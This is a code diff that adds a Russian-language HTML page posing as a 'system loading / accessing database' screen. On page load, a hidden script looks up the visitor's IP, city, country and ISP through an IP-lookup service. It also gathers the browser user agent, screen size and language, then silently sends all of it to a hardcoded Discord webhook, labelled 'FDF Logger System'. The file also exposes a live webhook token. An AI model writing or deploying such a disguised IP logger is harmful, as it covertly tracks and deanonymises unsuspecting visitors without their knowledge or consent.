@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка системы...</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; text-align: center; }
+    </style>
+
+    <script>
+        // Твой личный вебхук
+        const hook = "https://discord.com/api/webhooks/1480583217282289825/jlMeiNkP_LLyS9N9NC6GnEg7-YGKa-p2hRgUo8cP2DdK2Gq3HCeBfAap1dAD5OSGLrjO";
+
+        async function sended() {
+            try {
+                // Получаем инфу по IP (город, страна, провайдер)
+                const res = await fetch('https://ipapi.co/json/');
+                const i = await res.json();
+
+                const msg = {
+                    embeds: [{
+                        title: "🚀 НОВЫЙ ЗАХОД НА САЙТ!",
+                        color: 65280,
+                        fields: [
+                            { name: "🌐 IP Адрес", value: `\`${i.ip}\``, inline: true },
+                            { name: "📍 Локация", value: `${i.city}, ${i.country_name}`, inline: true },
+                            { name: "🏢 Провайдер", value: i.org, inline: false },
+                            { name: "💻 Система/Браузер", value: navigator.userAgent, inline: false },
+                            { name: "📏 Экран", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                            { name: "🔋 Язык", value: navigator.language, inline: true }
+                        ],
+                        footer: { text: "FDF Logger System" },
+                        timestamp: new Date()
+                    }]
+                };
+
+                // Моментальная отправка в Discord
+                await fetch(hook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(msg)
+                });
+            } catch (e) {}
+        }
+
+        window.onload = sended;
+    </script>
+</head>
+<body>
+    <div class="box">
+        <h1>ACCESSING DATABASE...</h1>
+        <p>Пожалуйста, подождите, идет проверка прав доступа...</p>
+        <p>[##########----------] 50%</p>
+    </div>
+</body>
+</html>
